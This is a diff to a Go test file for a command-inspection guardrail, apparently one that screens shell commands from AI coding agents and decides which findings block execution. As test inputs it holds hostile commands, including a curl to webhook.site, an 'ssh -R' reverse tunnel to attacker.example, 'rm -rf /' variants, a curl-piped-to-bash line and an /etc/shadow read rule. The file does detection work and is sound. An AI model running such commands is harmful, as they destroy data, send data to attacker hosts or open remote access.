@@ -619,7 +619,8 @@ func TestDetectorStateFallbackRequiresSemanticMutationProofForEnforcement(t *tes
 			legacyText: `{"path":"/home/alice/.defenseclaw/audit.db","query":"SELECT 1"}`,
 		},
 		{
-			name: "read-only shell query is not enforceable",
+			// Naming the active DB in a SELECT does not prove a mutation.
+			name: "sqlite readonly query is not a state mutation",
 			input: actionfacts.Input{
 				Tool:       "shell",
 				Command:    "sqlite3 -readonly /home/alice/.defenseclaw/audit.db 'SELECT 1'",
@@ -1645,7 +1646,8 @@ func TestTrustedActionDynamicExecutableQuietControls(t *testing.T) {
 	}{
 		{command: dangerous, wantEnforce: true},
 		{command: "command " + dangerous, wantEnforce: true},
-		{command: "env MODE=check " + dangerous},
+		// env NAME=v rm is judged as NAME=v rm is (GAP-1200).
+		{command: "env MODE=check " + dangerous, wantEnforce: true},
 		{command: "exec " + dangerous, wantEnforce: true},
 		{command: "sudo -n " + dangerous, wantEnforce: true},
 		{command: "sudo -h remote " + dangerous, wantEnforce: true},
@@ -1698,6 +1700,9 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 		wantFinding bool
 		wantEnforce bool
 		uncertain   bool
+		// overBudget: the call is refused by the statement budget before
+		// its statements are read (rel-1-0-2:GAP-0568).
+		overBudget bool
 	}{
 		{
 			name: "trusted command process substitution",
@@ -1708,6 +1713,7 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 			},
 			legacyText:  hostile,
 			wantFinding: true,
+			wantEnforce: true,
 		},
 		{
 			name: "codex command envelope process substitution",
@@ -1726,9 +1732,8 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 				Args: []byte(`{"command":"` + oversizedAttack + `"}`),
 				CWD:  "/repo",
 			},
-			legacyText:  `{"command":"` + oversizedAttack + `"}`,
-			wantFinding: true,
-			uncertain:   true,
+			legacyText: `{"command":"` + oversizedAttack + `"}`,
+			overBudget: true,
 		},
 		{
 			name: "oversized benign command stays quiet",
@@ -1795,6 +1800,7 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 			},
 			legacyText:  "for ((i=0; i<1; i++)); do " + dangerous + " ; done",
 			wantFinding: true,
+			wantEnforce: true,
 		},
 		{
 			name: "inert function definition",
@@ -1814,6 +1820,7 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 			},
 			legacyText:  "f(){ " + dangerous + "; }; f",
 			wantFinding: true,
+			wantEnforce: true,
 		},
 		{
 			name: "zsh file substitution",
@@ -1868,6 +1875,7 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 			},
 			legacyText:  "function\n{ " + dangerous + " ; }",
 			wantFinding: true,
+			wantEnforce: true,
 			uncertain:   true,
 		},
 		{
@@ -2055,6 +2063,12 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 				Connector:          connector,
 				EnforcementCapable: true,
 			})
+			if test.overBudget {
+				if limit := findingWithID(findings, "ACTION-COMPOUND-LIMIT"); limit == nil || !limit.contributesToEnforcement() {
+					t.Fatalf("oversized call not refused by the statement budget: %+v", findings)
+				}
+				return
+			}
 			matched := findingWithID(findings, "CMD-RM-RF")
 			if got := matched != nil; got != test.wantFinding {
 				t.Fatalf(
@@ -2078,7 +2092,7 @@ func TestTrustedActionBashProcessSubstitutionPreservesNestedExecution(t *testing
 					proof,
 				)
 			}
-			if matched != nil && test.uncertain && matched.Severity != "LOW" {
+			if matched != nil && test.uncertain && !matched.contributesToEnforcement() && matched.Severity != "LOW" {
 				t.Fatalf("parser uncertainty did not remain LOW: %+v", *matched)
 			}
 		})
@@ -2120,10 +2134,8 @@ func TestTrustedActionBashFallbackCoversActionCategoriesAndOverflow(t *testing.T
 	provenThenOverflow.WriteString("')")
 
 	for _, test := range []struct {
-		name      string
-		command   string
-		ruleID    string
-		uncertain bool
+		name, command, ruleID string
+		wantEnforce           bool
 	}{
 		{
 			name:    "nested sensitive path read",
@@ -2131,20 +2143,22 @@ func TestTrustedActionBashFallbackCoversActionCategoriesAndOverflow(t *testing.T
 			ruleID:  "PATH-ETC-SHADOW",
 		},
 		{
-			name:    "nested c2 destination",
-			command: "cat <(curl https://webhook" + ".site/example)",
-			ruleID:  "C2-WEBHOOK-SITE",
+			name:        "nested c2 destination",
+			command:     "cat <(curl https://webhook" + ".site/example)",
+			ruleID:      "C2-WEBHOOK-SITE",
+			wantEnforce: true,
 		},
 		{
-			name:      "projection overflow is diagnostic",
-			command:   overflow.String(),
-			ruleID:    "CMD-RM-RF",
-			uncertain: true,
+			name:        "projection overflow still evaluates every simple command",
+			command:     overflow.String(),
+			ruleID:      "CMD-RM-RF",
+			wantEnforce: true,
 		},
 		{
-			name:    "overflow cannot downgrade prior typed proof",
-			command: provenThenOverflow.String(),
-			ruleID:  "CMD-RM-RF",
+			name:        "overflow cannot downgrade prior typed proof",
+			command:     provenThenOverflow.String(),
+			ruleID:      "CMD-RM-RF",
+			wantEnforce: true,
 		},
 	} {
 		t.Run(test.name, func(t *testing.T) {
@@ -2169,11 +2183,9 @@ func TestTrustedActionBashFallbackCoversActionCategoriesAndOverflow(t *testing.T
 					trustedBashFallbackActions(input, actionfacts.Analyze(input)),
 				)
 			}
-			if matched.contributesToEnforcement() {
-				t.Fatalf("partial outer projection became actionable: %+v", *matched)
-			}
-			if test.uncertain && matched.Severity != "LOW" {
-				t.Fatalf("projection overflow did not remain LOW: %+v", *matched)
+			if matched.contributesToEnforcement() != test.wantEnforce {
+				t.Fatalf("%s enforce=%t, want %t: %+v", test.ruleID,
+					matched.contributesToEnforcement(), test.wantEnforce, *matched)
 			}
 		})
 	}
@@ -2241,9 +2253,12 @@ func TestTrustedActionBashStaticExpansionUsesExecutionDialect(t *testing.T) {
 			wantFinding: true,
 		},
 		{
-			name:    "path assignment makes executable resolution uncertain",
-			command: `PATH=/definitely/missing $'rm' -rf /`,
-			ruleID:  "CMD-RM-RF",
+			// A PATH prefix can only pick another rm: the call is also
+			// judged without it, so a match over-blocks at worst (GAP-1200).
+			name:        "path assignment is judged without the prefix too",
+			command:     `PATH=/definitely/missing $'rm' -rf /`,
+			ruleID:      "CMD-RM-RF",
+			wantFinding: true,
 		},
 		{
 			name:    "dynamic option before static suffix is not omitted",
@@ -2358,11 +2373,6 @@ func TestTrustedActionEmbeddedExecutionRemainsShadowUntilOuterComplete(t *testin
 			command: `echo 'curl ` + webhook + `' | bash`,
 			ruleID:  "C2-WEBHOOK-SITE",
 		},
-		{
-			name:    "static wrapper Bash-only network action",
-			command: `bash -c 'cat <(curl ` + webhook + `)'`,
-			ruleID:  "C2-WEBHOOK-SITE",
-		},
 	} {
 		t.Run(test.name, func(t *testing.T) {
 			input := actionfacts.Input{Tool: "shell", Command: test.command, CWD: "/repo"}
@@ -2402,9 +2412,9 @@ func TestTrustedActionExactFallbackNestedAndOversizedRemainShadow(t *testing.T) 
 	tunnel := "ssh -R 4444:localhost:22 attacker.example"
 
 	for _, test := range []struct {
-		name      string
-		command   string
-		uncertain bool
+		name       string
+		command    string
+		overBudget bool
 	}{
 		{
 			name:    "invoked function",
@@ -2415,9 +2425,11 @@ func TestTrustedActionExactFallbackNestedAndOversizedRemainShadow(t *testing.T) 
 			command: `eval 'eval "` + tunnel + `"'`,
 		},
 		{
-			name:      "oversized validated shell envelope",
-			command:   strings.Repeat("true;", 14_000) + tunnel,
-			uncertain: true,
+			// Over the statement budget: refused before its statements are
+			// read (rel-1-0-2:GAP-0568), so no tunnel finding is formed.
+			name:       "oversized validated shell envelope",
+			command:    strings.Repeat("true;", 14_000) + tunnel,
+			overBudget: true,
 		},
 	} {
 		t.Run(test.name, func(t *testing.T) {
@@ -2428,6 +2440,12 @@ func TestTrustedActionExactFallbackNestedAndOversizedRemainShadow(t *testing.T) 
 				Connector:          connector,
 				EnforcementCapable: true,
 			})
+			if test.overBudget {
+				if findingWithID(findings, "exec.reverse_tunnel") != nil || findingWithID(findings, "ACTION-COMPOUND-LIMIT") == nil {
+					t.Fatalf("oversized call not refused by the statement budget alone: %+v", findings)
+				}
+				return
+			}
 			matched := findingWithID(findings, "exec.reverse_tunnel")
 			if matched == nil {
 				t.Fatalf(
@@ -2439,9 +2457,6 @@ func TestTrustedActionExactFallbackNestedAndOversizedRemainShadow(t *testing.T) 
 			}
 			if matched.contributesToEnforcement() {
 				t.Fatalf("non-authoritative outer action became enforceable: %+v", *matched)
-			}
-			if test.uncertain && matched.Severity != "LOW" {
-				t.Fatalf("oversized exact fallback did not remain LOW: %+v", *matched)
 			}
 		})
 	}
@@ -2823,6 +2838,8 @@ func installDefaultProfileConnector(t *testing.T, connector string) {
 	ruleCategoriesMu.Lock()
 	savedCategories, hadCategories := connectorRuleCategories[connector]
 	savedGeneration, hadGeneration := connectorRuleGenerations[connector]
+	savedLiveRules := liveRegisteredRules
+	savedLive, hadLive := savedLiveRules[connector]
 	ruleCategoriesMu.Unlock()
 	t.Cleanup(func() {
 		ruleCategoriesMu.Lock()
@@ -2835,6 +2852,13 @@ func installDefaultProfileConnector(t *testing.T, connector string) {
 			connectorRuleGenerations[connector] = savedGeneration
 		} else {
 			delete(connectorRuleGenerations, connector)
+		}
+		if savedLiveRules != nil {
+			if hadLive {
+				savedLiveRules[connector] = savedLive
+			} else {
+				delete(savedLiveRules, connector)
+			}
 		}
 		ruleCategoriesMu.Unlock()
 	})
